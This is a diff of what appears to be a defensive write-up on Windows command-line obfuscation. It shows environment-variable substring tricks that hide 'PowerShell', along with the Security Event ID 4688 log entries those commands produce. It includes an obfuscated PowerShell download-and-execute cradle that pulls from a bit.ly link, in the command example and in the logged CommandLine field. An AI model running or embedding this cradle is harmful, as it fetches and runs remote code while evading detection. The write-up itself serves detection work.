@@ -66,25 +66,8 @@ Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFI
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
 ![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
-and that's how it's going to look in WEL:
+This is how it's going to look in WEL:
 ```XML
-- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-- <System>
-  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
-  <EventID>4688</EventID> 
-  <Version>1</Version> 
-  <Level>0</Level> 
-  <Task>13312</Task> 
-  <Opcode>0</Opcode> 
-  <Keywords>0x8020000000000000</Keywords> 
-  <TimeCreated SystemTime="2020-07-07T12:18:13.165726000Z" /> 
-  <EventRecordID>8592</EventRecordID> 
-  <Correlation /> 
-  <Execution ProcessID="4" ThreadID="4848" /> 
-  <Channel>Security</Channel> 
-  <Computer>WIN-JHK6BC88K34</Computer> 
-  <Security /> 
-  </System>
 - <EventData>
   <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
   <Data Name="SubjectUserName">admin</Data> 
@@ -94,43 +77,10 @@ and that's how it's going to look in WEL:
   <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
   <Data Name="TokenElevationType">%%1936</Data> 
   <Data Name="ProcessId">0x108</Data> 
-  <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)"</Data> 
+  <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)" </Data> 
   </EventData>
-  </Event>
 ```
-
-```XML
-- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-- <System>
-  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
-  <EventID>4688</EventID> 
-  <Version>1</Version> 
-  <Level>0</Level> 
-  <Task>13312</Task> 
-  <Opcode>0</Opcode> 
-  <Keywords>0x8020000000000000</Keywords> 
-  <TimeCreated SystemTime="2020-07-07T12:18:13.165726000Z" /> 
-  <EventRecordID>8593</EventRecordID> 
-  <Correlation /> 
-  <Execution ProcessID="4" ThreadID="4848" /> 
-  <Channel>Security</Channel> 
-  <Computer>WIN-JHK6BC88K34</Computer> 
-  <Security /> 
-  </System>
-- <EventData>
-  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
-  <Data Name="SubjectUserName">admin</Data> 
-  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
-  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
-  <Data Name="NewProcessId">0x10d8</Data> 
-  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
-  <Data Name="TokenElevationType">%%1936</Data> 
-  <Data Name="ProcessId">0xa44</Data> 
-  <Data Name="CommandLine">powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)</Data> 
-  </EventData>
-  </Event>
-```
-
+*obfuscated command in the CMD WEL Security Event ID 4688<br>
 
 ### ENCODING
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
